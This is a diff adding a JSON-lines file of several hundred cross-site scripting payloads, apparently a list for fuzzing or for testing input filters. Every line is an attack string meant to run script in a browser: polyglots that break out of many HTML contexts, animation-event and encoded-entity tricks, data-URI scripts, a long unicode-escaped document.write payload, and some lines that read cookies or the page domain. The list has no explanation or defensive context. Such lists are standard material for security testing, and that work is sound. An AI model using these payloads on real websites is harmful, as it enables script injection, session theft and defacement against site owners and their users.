@@ -1,0 +1,362 @@
+{"payload": "<style><img src=\"</style><img src=x onerror=javascript:alert(1)//\">"}
+{"payload": "javascript:alert();//<img src=x:x onerror=alert(1)>\\\";alert();//\";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!--"}
+{"payload": "<style>@keyframes x{}</style><sub style=\"animation-name:x\" onanimationend=\"alert(1)\"></sub>"}
+{"payload": "<style>@keyframes x{}</style><wbr style=\"animation-name:x\" onanimationend=\"alert(1)\"></wbr>"}
+{"payload": "<script src=\"data:\\xE0\\xA4\\x98,javascript:alert(1)\"></script>"}
+{"payload": "\"><img src=1 onerror=alert(1)>.gif"}
+{"payload": "<iframe/onload=alert(/INJECTX/)>"}
+{"payload": "<script src=\"data:\\xD4\\x8F,javascript:alert(6875)\"></script>"}
+{"payload": "<iframe/src \\/\\/onload = alert(42)"}
+{"payload": "<iframe/src=\"data:text/html,<svg onload=alert(1)>\">"}
+{"payload": "<style>@keyframes x{}</style><sup style=\"animation-name:x\" onanimationend=\"alert(1)\"></sup>"}
+{"payload": "<style>@keyframes x{}</style><label style=\"animation-name:x\" onanimationend=\"alert(1)\"></label>"}
+{"payload": "<style>@keyframes x{}</style><dl style=\"animation-name:x\" onanimationend=\"alert(1)\"></dl>"}
+{"payload": "<style>@keyframes x{}</style><nobr style=\"animation-name:x\" onanimationstart=\"alert(1)\"></nobr>"}
+{"payload": "<style>@keyframes x{}</style><video style=\"animation-name:x\" onanimationstart=\"alert(1)\"></video>"}
+{"payload": "<body onload=;;;;;;;;;;;_=alert;_(1);;;;"}
+{"payload": "<audio src=1 href=1 onerror=\"javascript:alert(5920)\"></audio>"}
+{"payload": "!--\" /><script>alert('xss');</script>"}
+{"payload": "\"'><script>alert(/XSS/)</script>"}
+{"payload": "<style>@keyframes x{}</style><dl style=\"animation-name:x\" onanimationstart=\"alert(1)\"></dl>"}
+{"payload": "Exploit String: <BODY ONLOAD=alert('XSS')>"}
+{"payload": "<style onload=alert(1)></style>"}
+{"payload": "veris-->group<svg/onload=alert(/XSS/)//"}
+{"payload": "<svg><![CDATA[><image xlink:href=\"]]><img src=xx:x onerror=alert(2)//\"></svg>//[\"'`-->]]>]</div>"}
+{"payload": "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>"}
+{"payload": "<iframe onload=alert(1)></iframe>"}
+{"payload": "<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>"}
+{"payload": "<style>@keyframes x{}</style><area style=\"animation-name:x\" onanimationstart=\"alert(1)\"></area>"}
+{"payload": "<image src=1 href=1 onerror=\"javascript:alert(3089)\"></image>"}
+{"payload": "\"><svg onload=alert(1)>.gif"}
+{"payload": "<? foo=\"><script>alert(1)</script>\">"}
+{"payload": "<details ontoggle=alert(1) open>test</details>"}
+{"payload": "<style>@keyframes x{}</style><sub style=\"animation-name:x\" onanimationstart=\"alert(1)\"></sub>"}
+{"payload": "\"><script>alert(0);</script>"}
+{"payload": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(47)</script></svg>"}
+{"payload": "javascript:\"/*\\\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame/onload=alert()><<svg/onload= /**/alert()//>"}
+{"payload": "<? foo=\"><script>javascript:alert(1353)</script>\">"}
+{"payload": "javascript:alert(1)//\\\";alert(1);<!--jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC=\"javascript:alert(1);\"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)//"}
+{"payload": "<style>@keyframes x{}</style><cite style=\"animation-name:x\" onanimationend=\"alert(1)\"></cite>"}
+{"payload": "<style>@keyframes x{}</style><dt style=\"animation-name:x\" onanimationstart=\"alert(1)\"></dt>"}
+{"payload": "<div id=\"29\"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//[\"'`-->]]>]</div><div id=\"30\"><style>@import \"data:,*%7bx:expression(alert(30))%7D\";</style>//[\"'`-->]]>]</div><div id=\"31\"><frameset onload=alert(31)>//[\"'`-->]]>]</div><div id=\"32\"><table background=\"javascript:alert(32)\"></table>//[\"'`-->]]>]</div><div id=\"33\"><a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"alert(33);\">XXX</a></a><a href=\"javascript:alert(2)\">XXX</a>//[\"'`-->]]>]</div><div id=\"34\">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//[\"'`-->]]>]</div><div id=\"35\">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//[\"'`-->]]>]</div><div id=\"36\"><a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(36)\">XXX</a>//[\"'`-->]]>]</div><div id=\"37\"><!--<img src=\"--><img src=x onerror=alert(37)//\">//[\"'`-->]]>]</div><div id=\"38\"><comment><img src=\"</comment><img src=x onerror=alert(38)//\">//[\"'`-->]]>]</div>"}
+{"payload": "<script>alert('XSS')</script>"}
+{"payload": "\"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt=\""}
+{"payload": "<script src=\"data:\\xD4\\x8F,javascript:alert(1)\"></script>"}
+{"payload": "<script>alert(\"hellox worldss\")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510"}
+{"payload": "'\">><script>alert('XSS')</script>"}
+{"payload": "<style>@keyframes x{}</style><blink style=\"animation-name:x\" onanimationend=\"alert(1)\"></blink>"}
+{"payload": "<script itworksinallbrowsers>/*<script* */alert(3068)</script"}
+{"payload": "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>"}
+{"payload": "<script src=\"data:text/javascript,alert(1)\"></script>"}
+{"payload": "</script><img/*%00/src=\"worksinchrome&colon;prompt(1)\"/%00*/onerror='eval(src)'>"}
+{"payload": "'\"></title><script>alert(1111)</script>"}
+{"payload": "<! foo=\"><script>javascript:alert(4032)</script>\">"}
+{"payload": "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>"}
+{"payload": "<style>@keyframes x{}</style><slot style=\"animation-name:x\" onanimationend=\"alert(1)\"></slot>"}
+{"payload": "Exploit String: > <script>alert(4)</script>"}
+{"payload": "<style>@keyframes x{}</style><code style=\"animation-name:x\" onanimationend=\"alert(1)\"></code>"}
+{"payload": "<style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationend=\"alert(1)\"></div>"}
+{"payload": "<body <body onload=;;;;;al:eval('al'+'ert(1)');;>"}
+{"payload": "javascript:\"/*'/*\\\"/*` /**/alert()//--></title></textarea></style></noscript></noembed></template></script><script>alert()</script><svg/<frame/onload=alert()>"}
+{"payload": "<style>@keyframes x{}</style><xmp style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xmp>"}
+{"payload": "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>"}
+{"payload": "javascript:/*\"/*\\\"/*`/*'/**/ (alert())//</title></textarea></style></noscript></script></noembed></template></select><frame src=javascript:alert()--><<svg/onload=alert()>"}
+{"payload": "<style>@keyframes x{}</style><dir style=\"animation-name:x\" onanimationstart=\"alert(1)\"></dir>"}
+{"payload": "'\"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>"}
+{"payload": "<script>+-+-1-+-+alert(4141)</script>"}
+{"payload": "element[attribute='<img src=x onerror=alert('XSS');>"}
+{"payload": "<style>@keyframes x{}</style><canvas style=\"animation-name:x\" onanimationend=\"alert(1)\"></canvas>"}
+{"payload": "<script>alert(\"XSS by \\nxss\")</script><marquee><h1>XSS by xss</h1></marquee>"}
+{"payload": "javascript:/*\"/*`/*'/*\\\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*<svg <frame onload=/**/alert()//</script>"}
+{"payload": "<script language=\"JavaScript\">alert('XSS')</script>"}
+{"payload": "<style>@keyframes x{}</style><option style=\"animation-name:x\" onanimationend=\"alert(1)\"></option>"}
+{"payload": "<script x> alert(8948) </script 1=2"}
+{"payload": "?p[<script>`]=`/alert(1)</script>"}
+{"payload": "<img src=foo.png onerror=alert(/xssed/) />"}
+{"payload": "<style>@keyframes x{}</style><pre style=\"animation-name:x\" onanimationstart=\"alert(1)\"></pre>"}
+{"payload": "<script itworksinallbrowsers>/*<script* */alert(1)</script"}
+{"payload": "<style><img src=\"</style><img src=x onerror=javascript:alert(4204)//\">"}
+{"payload": "<input autofocus onfocus=alert(1)>"}
+{"payload": "<BODY ONLOAD=alert(\"XSS\")>"}
+{"payload": "</script><img/*%00/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"/%00*/onerror='eval(src)'>"}
+{"payload": "<--`<iMG/srC=` onerror=confirm``> --!>"}
+{"payload": "\"><svg onload=alert(1)>"}
+{"payload": "<style>@keyframes x{}</style><br style=\"animation-name:x\" onanimationend=\"alert(1)\"></br>"}
+{"payload": "<style>@keyframes x{}</style><figcaption style=\"animation-name:x\" onanimationend=\"alert(1)\"></figcaption>"}
+{"payload": "<style>@keyframes x{}</style><h1 style=\"animation-name:x\" onanimationend=\"alert(1)\"></h1>"}
+{"payload": "<svg onload=\"javascript:alert(65)\" xmlns=\"http://www.w3.org/2000/svg\"></svg>"}
+{"payload": "<style>@keyframes x{}</style><plaintext style=\"animation-name:x\" onanimationend=\"alert(1)\"></plaintext>"}
+{"payload": "<img src/onerror=prompt(8)>"}
+{"payload": "\"><img src=x onerror=javascript:alert(`1`)>"}
+{"payload": "javascript:alert()//'//\"//\\\"; '/`/*\\/*'/*\"/**/(alert())//</style></template/</title/</textarea/</noscript/</noembed/</script>--><frame <svg onload=alert()><script>alert()</script>"}
+{"payload": "<style>@keyframes x{}</style><ruby style=\"animation-name:x\" onanimationstart=\"alert(1)\"></ruby>"}
+{"payload": "<x onanimationend=alert(1)><style>x{animation:s}@keyframes s{}"}
+{"payload": "<video src/onerror=alert(1)>"}
+{"payload": "<style>@keyframes x{}</style><button style=\"animation-name:x\" onanimationstart=\"alert(1)\"></button>"}
+{"payload": "/*iframe/src*/<iframe/src=\"<iframe/src=@\"/onload=prompt(1) /*iframe/src*/>"}
+{"payload": "<style>@keyframes x{}</style><strike style=\"animation-name:x\" onanimationend=\"alert(1)\"></strike>"}
+{"payload": "<style>@keyframes x{}</style><keygen style=\"animation-name:x\" onanimationend=\"alert(1)\"></keygen>"}
+{"payload": "<img src ?itworksonchrome?\\/onerror = alert(0008)"}
+{"payload": "<BODY ONLOAD=alert('XSS')>"}
+{"payload": "<img/src=`%00` onerror=this.onerror=confirm(1)"}
+{"payload": "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>"}
+{"payload": "<style>@keyframes x{}</style><meter style=\"animation-name:x\" onanimationstart=\"alert(1)\"></meter>"}
+{"payload": "<!--<img src=\"--><img src=x onerror=alert(1)//\">//INJECTX"}
+{"payload": "<img/src=@&#32;&#13; onerror = prompt('&#49&#49&#49&#49;')"}
+{"payload": "JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->"}
+{"payload": "<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>"}
+{"payload": "<script>throw onerror=alert,'some string',123,'haha'</script>"}
+{"payload": "<BODY ONLOAD=javascript:alert(3213)>"}
+{"payload": "<style>@keyframes x{}</style><label style=\"animation-name:x\" onanimationstart=\"alert(1)\"></label>"}
+{"payload": "<style>@keyframes x{}</style><dd style=\"animation-name:x\" onanimationstart=\"alert(1)\"></dd>"}
+{"payload": "<style>@keyframes x{}</style><u style=\"animation-name:x\" onanimationend=\"alert(1)\"></u>"}
+{"payload": "xss\"><!--><svg/onload=alert(document.domain)>"}
+{"payload": "javascript:/*\"/*`/*'/*\\\"/*-->*/ alert()//</title></textarea></style></noscript></noembed></template></script></select><frame/onload=alert``><<svg/onload=alert()>"}
+{"payload": "1<svg onload=alert(1)>"}
+{"payload": "<style>@keyframes x{}</style><applet style=\"animation-name:x\" onanimationstart=\"alert(1)\"></applet>"}
+{"payload": "<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>"}
+{"payload": "</script><img/*%00/src=\"worksinchrome&colon;prompt&#x28;1440&#x29;\"/%00*/onerror='eval(src)'>"}
+{"payload": "<style>@keyframes x{}</style><h1 style=\"animation-name:x\" onanimationstart=\"alert(1)\"></h1>"}
+{"payload": "javascript:/*\"/*'/*`/*\\\"/**/ alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>--><<svg onload=alert()><frame src=javascript:alert()>"}
+{"payload": "<style>@keyframes x{}</style><strong style=\"animation-name:x\" onanimationend=\"alert(1)\"></strong>"}
+{"payload": "\"><img src=x onerror=javascript:alert((\"1\"))>"}
+{"payload": "javascript:alert()//<frame/src=javascript:alert()><svg/onload=alert()>`;alert()`';alert()//\\\";alert();//\"//--></title></textarea></style></noscript></noembed></template></option></select></script><svg onload=alert()>*/ alert()//*"}
+{"payload": "<!'/*\"/*/'/*/\"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>"}
+{"payload": "<style>@keyframes x{}</style><command style=\"animation-name:x\" onanimationstart=\"alert(1)\"></command>"}
+{"payload": "<style>@keyframes x{}</style><main style=\"animation-name:x\" onanimationend=\"alert(1)\"></main>"}
+{"payload": "--><!-- ---> <img src=xxx:x onerror=javascript:alert(7730)> -->"}
+{"payload": "<style>@keyframes x{}</style><bgsound style=\"animation-name:x\" onanimationstart=\"alert(1)\"></bgsound>"}
+{"payload": "<style>@keyframes x{}</style><object style=\"animation-name:x\" onanimationstart=\"alert(1)\"></object>"}
+{"payload": "<style>@keyframes x{}</style><source style=\"animation-name:x\" onanimationend=\"alert(1)\"></source>"}
+{"payload": "<svg onload=alert&#40;1&#41>"}
+{"payload": "<style>@keyframes x{}</style><center style=\"animation-name:x\" onanimationstart=\"alert(1)\"></center>"}
+{"payload": "javascript:`/*\\\"/*--><svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover=\"/**/ alert()//'\">`"}
+{"payload": "<style>@keyframes x{}</style><hgroup style=\"animation-name:x\" onanimationend=\"alert(1)\"></hgroup>"}
+{"payload": "<img src/onerror=alert(1)>"}
+{"payload": "<iframe srcdoc=\"&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(8195)&amp;gt;>\">"}
+{"payload": "<style>@keyframes x{}</style><del style=\"animation-name:x\" onanimationstart=\"alert(1)\"></del>"}
+{"payload": "<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>"}
+{"payload": "javascript:\"/*\\\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>"}
+{"payload": "<textarea autofocus onfocus=alert(1)>//INJECTX"}
+{"payload": "<style>@keyframes x{}</style><bdo style=\"animation-name:x\" onanimationstart=\"alert(1)\"></bdo>"}
+{"payload": "<style>@keyframes x{}</style><acronym style=\"animation-name:x\" onanimationend=\"alert(1)\"></acronym>"}
+{"payload": "<style>@keyframes x{}</style><samp style=\"animation-name:x\" onanimationend=\"alert(1)\"></samp>"}
+{"payload": "<style>@keyframes x{}</style><nobr style=\"animation-name:x\" onanimationend=\"alert(1)\"></nobr>"}
+{"payload": "<style>@keyframes x{}</style><bdo style=\"animation-name:x\" onanimationend=\"alert(1)\"></bdo>"}
+{"payload": "<img/&#09;&#10;&#11; src=`~` onerror=prompt(4464)>"}
+{"payload": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>"}
+{"payload": "<style>@keyframes x{}</style><shadow style=\"animation-name:x\" onanimationend=\"alert(1)\"></shadow>"}
+{"payload": "<img src=1 onerror=alert(1)>"}
+{"payload": "<style>@keyframes x{}</style><img style=\"animation-name:x\" onanimationstart=\"alert(1)\"></img>"}
+{"payload": "<input autofocus onfocus=alert(1)>//INJECTX"}
+{"payload": "javascript:\"/*`/*\\\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*<i<frame/*/ onload=alert()//</Script>"}
+{"payload": "<style>@keyframes x{}</style><legend style=\"animation-name:x\" onanimationend=\"alert(1)\"></legend>"}
+{"payload": "<style>@keyframes x{}</style><details style=\"animation-name:x\" onanimationstart=\"alert(1)\"></details>"}
+{"payload": "<style>@keyframes x{}</style><svg style=\"animation-name:x\" onanimationstart=\"alert(1)\"></svg>"}
+{"payload": "<video src=1 href=1 onerror=\"javascript:alert(8771)\"></video>"}
+{"payload": "<image/src/onerror=prompt(8)>"}
+{"payload": "<style>@keyframes x{}</style><legend style=\"animation-name:x\" onanimationstart=\"alert(1)\"></legend>"}
+{"payload": "<style>@keyframes x{}</style><area style=\"animation-name:x\" onanimationend=\"alert(1)\"></area>"}
+{"payload": "<style>@keyframes x{}</style><s style=\"animation-name:x\" onanimationstart=\"alert(1)\"></s>"}
+{"payload": "<style>@keyframes x{}</style><dd style=\"animation-name:x\" onanimationend=\"alert(1)\"></dd>"}
+{"payload": "<img src=\"/\" =_=\" title=\"onerror='alert(42)'\">"}
+{"payload": "<style>@keyframes x{}</style><img style=\"animation-name:x\" onanimationend=\"alert(1)\"></img>"}
+{"payload": "<style>@keyframes x{}</style><dfn style=\"animation-name:x\" onanimationend=\"alert(1)\"></dfn>"}
+{"payload": "<style>@keyframes x{}</style><li style=\"animation-name:x\" onanimationstart=\"alert(1)\"></li>"}
+{"payload": "<style>@keyframes x{}</style><keygen style=\"animation-name:x\" onanimationstart=\"alert(1)\"></keygen>"}
+{"payload": "<video><track default onload=alert(1) src=\"data:text/vtt,WEBVTT\"></video>"}
+{"payload": "<style>@keyframes x{}</style><meter style=\"animation-name:x\" onanimationend=\"alert(1)\"></meter>"}
+{"payload": "<style>@keyframes x{}</style><hr style=\"animation-name:x\" onanimationend=\"alert(1)\"></hr>"}
+{"payload": "<style>@keyframes x{}</style><plaintext style=\"animation-name:x\" onanimationstart=\"alert(1)\"></plaintext>"}
+{"payload": "<style>@KeyFrames x{</style><div style=animation-name:x onanimationstart=alert(1)> <"}
+{"payload": "<video><source onerror=\"alert(55)\">"}
+{"payload": "<style>@keyframes x{}</style><s style=\"animation-name:x\" onanimationend=\"alert(1)\"></s>"}
+{"payload": "<style>@keyframes x{}</style><rtc style=\"animation-name:x\" onanimationstart=\"alert(1)\"></rtc>"}
+{"payload": "</tag><svg onload=alert(1)>"}
+{"payload": "<style>@keyframes x{}</style><track style=\"animation-name:x\" onanimationend=\"alert(1)\"></track>"}
+{"payload": "<img/src=`` onerror=this.onerror=confirm(1)"}
+{"payload": "<form><a href=\"javascript:\\u0061lert&#x28;1&#x29;\">X</script><img/*/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"/*/onerror='eval(src)'>"}
+{"payload": "</scrip</script>t><img src =q onerror=prompt(8)>"}
+{"payload": "\"'><script>confirm(42)</script>"}
+{"payload": "<img/src/onerror=prompt(8)>"}
+{"payload": "<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?"}
+{"payload": "<iframe/src \\/\\/onload = prompt(1)"}
+{"payload": "<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>"}
+{"payload": "\"'><script>prompt(42)</script>"}
+{"payload": "<iframe/src \\/\\/onload = prompt(5682)"}
+{"payload": "<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>"}
+{"payload": "<sCriPt x>(((confirm)))``</scRipt x>"}
+{"payload": "<SVg </onlOad =\"1> (_=prompt,_(1)) \"\">"}
+{"payload": "<img src=\"Mario Heiderich says that svg SHOULD not be executed trough image tags\" onerror=\"javascript:document.write('\\u003c\\u0069\\u0066\\u0072\\u0061\\u006d\\u0065\\u0020\\u0073\\u0072\\u0063\\u003d\\u0022\\u0064\\u0061\\u0074\\u0061\\u003a\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0073\\u0076\\u0067\\u002b\\u0078\\u006d\\u006c\\u003b\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002c\\u0050\\u0048\\u004e\\u0032\\u005a\\u0079\\u0042\\u0034\\u0062\\u0057\\u0078\\u0075\\u0063\\u007a\\u0030\\u0069\\u0061\\u0048\\u0052\\u0030\\u0063\\u0044\\u006f\\u0076\\u004c\\u0033\\u0064\\u0033\\u0064\\u0079\\u0035\\u0033\\u004d\\u0079\\u0035\\u0076\\u0063\\u006d\\u0063\\u0076\\u004d\\u006a\\u0041\\u0077\\u004d\\u0043\\u0039\\u007a\\u0064\\u006d\\u0063\\u0069\\u0050\\u0069\\u0041\\u0067\\u0043\\u0069\\u0041\\u0067\\u0049\\u0044\\u0078\\u0070\\u0062\\u0057\\u0046\\u006e\\u005a\\u0053\\u0042\\u0076\\u0062\\u006d\\u0078\\u0076\\u0059\\u0057\\u0051\\u0039\\u0049\\u006d\\u0046\\u0073\\u005a\\u0058\\u004a\\u0030\\u004b\\u0044\\u0045\\u0070\\u0049\\u006a\\u0034\\u0038\\u004c\\u0032\\u006c\\u0074\\u0059\\u0057\\u0064\\u006c\\u0050\\u0069\\u0041\\u0067\\u0043\\u0069\\u0041\\u0067\\u0049\\u0044\\u0078\\u007a\\u0064\\u006d\\u0063\\u0067\\u0062\\u0032\\u0035\\u0073\\u0062\\u0032\\u0046\\u006b\\u0050\\u0053\\u004a\\u0068\\u0062\\u0047\\u0056\\u0079\\u0064\\u0043\\u0067\\u0079\\u004b\\u0053\\u0049\\u002b\\u0050\\u0043\\u0039\\u007a\\u0064\\u006d\\u0063\\u002b\\u0049\\u0043\\u0041\\u004b\\u0049\\u0043\\u0041\\u0067\\u0050\\u0048\\u004e\\u006a\\u0063\\u006d\\u006c\\u0077\\u0064\\u0044\\u0035\\u0068\\u0062\\u0047\\u0056\\u0079\\u0064\\u0043\\u0067\\u007a\\u004b\\u0054\\u0077\\u0076\\u0063\\u0032\\u004e\\u0079\\u0061\\u0058\\u0042\\u0030\\u0050\\u0069\\u0041\\u0067\\u0043\\u0069\\u0041\\u0067\\u0049\\u0044\\u0078\\u006b\\u005a\\u0057\\u005a\\u007a\\u0049\\u0047\\u0039\\u0075\\u0062\\u0047\\u0039\\u0068\\u005a\\u0044\\u0030\\u0069\\u0059\\u0057\\u0078\\u006c\\u0063\\u006e\\u0051\\u006f\\u004e\\u0043\\u006b\\u0069\\u0050\\u006a\\u0077\\u0076\\u005a\\u0047\\u0056\\u006d\\u0063\\u007a\\u0034\\u0067\\u0049\\u0041\\u006f\\u0067\\u0049\\u0043\\u0041\\u0038\\u005a\\u0079\\u0042\\u0076\\u0062\\u006d\\u0078\\u0076\\u0059\\u0057\\u0051\\u0039\\u0049\\u006d\\u0046\\u0073\\u005a\\u0058\\u004a\\u0030\\u004b\\u0044\\u0055\\u0070\\u0049\\u006a\\u0034\\u0067\\u0049\\u0041\\u006f\\u0067\\u0049\\u0043\\u0041\\u0067\\u0049\\u0043\\u0041\\u0067\\u0050\\u0047\\u004e\\u0070\\u0063\\u006d\\u004e\\u0073\\u005a\\u0053\\u0042\\u0076\\u0062\\u006d\\u0078\\u0076\\u0059\\u0057\\u0051\\u0039\\u0049\\u006d\\u0046\\u0073\\u005a\\u0058\\u004a\\u0030\\u004b\\u0044\\u0059\\u0070\\u0049\\u0069\\u0041\\u0076\\u0050\\u0069\\u0041\\u0067\\u0043\\u0069\\u0041\\u0067\\u0049\\u0043\\u0041\\u0067\\u0049\\u0043\\u0041\\u0038\\u0064\\u0047\\u0056\\u0034\\u0064\\u0043\\u0042\\u0076\\u0062\\u006d\\u0078\\u0076\\u0059\\u0057\\u0051\\u0039\\u0049\\u006d\\u0046\\u0073\\u005a\\u0058\\u004a\\u0030\\u004b\\u0044\\u0063\\u0070\\u0049\\u006a\\u0034\\u0038\\u004c\\u0033\\u0052\\u006c\\u0065\\u0048\\u0051\\u002b\\u0049\\u0043\\u0041\\u004b\\u0049\\u0043\\u0041\\u0067\\u0050\\u0043\\u0039\\u006e\\u0050\\u0069\\u0041\\u0067\\u0043\\u006a\\u0077\\u0076\\u0063\\u0033\\u005a\\u006e\\u0050\\u0069\\u0041\\u0067\\u0022\\u003e\\u003c\\u002f\\u0069\\u0066\\u0072\\u0061\\u006d\\u0065\\u003e');\"></img>"}
+{"payload": "<script>prompt(1)</script>"}
+{"payload": "<ScRipT 5-0*3+9/3=>prompt(2296)</ScRipT giveanswerhere=?"}
+{"payload": "<svg><script>//&NewLine;confirm(1);</script </svg>"}
+{"payload": "<img/src=@&#32;&#13; onerror = prompt('&#49;')"}
+{"payload": "'><img src=x onError=prompt(\"OpenBugBounty\")>"}
+{"payload": "<image src/onerror=prompt(8)>"}
+{"payload": "&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'"}
+{"payload": "\"'><script foo=bar>confirm(42)</script>"}
+{"payload": "\"><img src=x onerror=prompt(1);>"}
+{"payload": "<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;"}
+{"payload": "<script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>"}
+{"payload": "<script /***/>/***/confirm('\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450')/***/</script /***/"}
+{"payload": "Exploit String: <body <body onload=;;;;;al:eval('al'+'ert(1)');;>"}
+{"payload": "<iframe srcdoc='&lt;body onload=prompt&lpar;1411&rpar;&gt;'>"}
+{"payload": "<script>confirm(1)</script>"}
+{"payload": "<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;"}
+{"payload": "<scRiPt y=\"><\">/*<sCRipt* */prompt()</script"}
+{"payload": "<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>"}
+{"payload": "http://www.<script>alert(1844)</script .com"}
+{"payload": "<script src=\"data:\\xCB\\x8F,javascript:alert(1)\"></script>"}
+{"payload": "\"><script>alert(0)</script>"}
+{"payload": "<IMG \"\"\"><SCRIPT>alert(4432)</SCRIPT>\">"}
+{"payload": "\"'><script>alert('XSS')</script>"}
+{"payload": "'<script>alert(0);</script>"}
+{"payload": "<script src=1 href=1 onerror=\"javascript:alert(9446)\"></script>"}
+{"payload": "<div id=\"54\"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[\"'`-->]]>]</div><div id=\"55\"><video><source onerror=\"alert(55)\">//[\"'`-->]]>]</div><div id=\"56\"><video onerror=\"alert(56)\"><source></source></video>//[\"'`-->]]>]</div><div id=\"57\"><b <script>alert(57)//</script>0</script></b>//[\"'`-->]]>]</div><div id=\"58\"><b><script<b></b><alert(58)</script </b></b>//[\"'`-->]]>]</div><div id=\"59\"><div id=\"div1\"><input value=\"``onmouseover=alert(59)\"></div> <div id=\"div2\"></div><script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script>//[\"'`-->]]>]</div><div id=\"60\"><div style=\"[a]color[b]:[c]red\">XXX</div>//[\"'`-->]]>]</div>"}
+{"payload": "Exploit String: <<SCRIPT>alert(\"XSS\");//<</SCRIPT>"}
+{"payload": "<script /*%00*/>/*%00*/alert(8053)/*%00*/</script /*%00*/"}
+{"payload": "<script>new class extends class extends class extends class extends alert(1){}{}{}{}</script>"}
+{"payload": "'></select><script>alert(123)</script>"}
+{"payload": "<script>var a = \"</script> <script> alert('XSS !'); </script> <script>\";</script>"}
+{"payload": "<script>throw new class extends Function{}('alert(1)')``</script>     <script>x=new class extends Function{}('alert(1)'); x=new x;</script>     <script>new class extends alert(1){}</script>"}
+{"payload": "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"}
+{"payload": "javascript:alert()//*/alert()/*'-/\"/-eval(`(alert())`)//\\\"-alert()//--></title></style></noscript></textarea></template></noembed><script>alert()</script><frameset onload=alert()><svg/onload=alert(1)> alert()//"}
+{"payload": "<script>new function(){new.target.constructor('alert(1)')();}</script>     <script>Reflect.construct(function(){new.target.constructor('alert(1)')()},[])</script>"}
+{"payload": "http://www.google<script .com>alert(document.location)</script"}
+{"payload": "\"><script>alert('XSS')</script>"}
+{"payload": "Exploit String: http://aa\"><script>alert(123)</script>"}
+{"payload": "</textarea><script>alert(/xss/)</script>"}
+{"payload": "Exploit String: http://aa<script>alert(123)</script>"}
+{"payload": "</ foo=\"><script>javascript:alert(6163)</script>\">"}
+{"payload": "<body background=javascript:'\"><script>alert(navigator.userAgent)</script>></body>"}
+{"payload": "Exploit String: '> <script>alert(3)</script>"}
+{"payload": "='><script>alert(\"xss\")</script>"}
+{"payload": "<script>javascript:alert(9177)</script>"}
+{"payload": "\"'><script>alert(42)</script>"}
